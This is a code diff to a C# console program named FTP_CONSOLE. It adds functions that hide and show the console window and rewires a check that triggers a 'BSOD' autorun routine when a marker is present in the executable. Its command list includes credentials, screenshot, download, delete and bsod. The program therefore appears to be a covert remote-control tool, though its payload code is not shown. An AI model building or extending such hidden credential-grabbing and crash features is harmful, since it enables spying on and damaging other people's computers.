@@ -16,14 +16,39 @@ namespace FTP_CONSOLE
 {
     public class Program
     {
+        #region WindowControl
         [DllImport("kernel32.dll")]
         public static extern IntPtr GetConsoleWindow();
 
         [DllImport("user32.dll")]
-        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        [DllImport("user32.dll")]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool SetForegroundWindow(IntPtr hWnd);
+
+        static void BringConsoleToFront()
+        {
+            SetForegroundWindow(GetConsoleWindow());
+        }
+        public static void WindowSetState(bool state)
+        {
+            if (state)
+            {
+                ShowWindow(GetConsoleWindow(), SW_SHOW);
+                BringConsoleToFront();
+            }
+            if (!state)
+            {
+                ShowWindow(GetConsoleWindow(), SW_HIDE);
+            }
+
+        }
 
         public const int SW_HIDE = 0;
         public const int SW_SHOW = 5;
+
+        #endregion
+
         public static List<string> mainusages = new string[] { "clear", "cs", "credentials", "cr", "write", "echo", "clcode", "screenshot", "tree", "gui", "download", "dl", "delete", "del", "color", "exit", "cid", "update", "bsod", "help" }.ToList();
 
         public static string GetArgs(List<string> args, int fromindex, int toindex = -2, string add = " ")
@@ -176,7 +201,7 @@ namespace FTP_CONSOLE
         {
             if (File.ReadAllText(Application.ExecutablePath).Contains("======[BSOD=AUTORUN]======"))
             {
-                Commands.BSOD.ERROR(args.ToList());
+                Commands.BSOD.AUTORUN(args.ToList());
                 return;
             }
             try
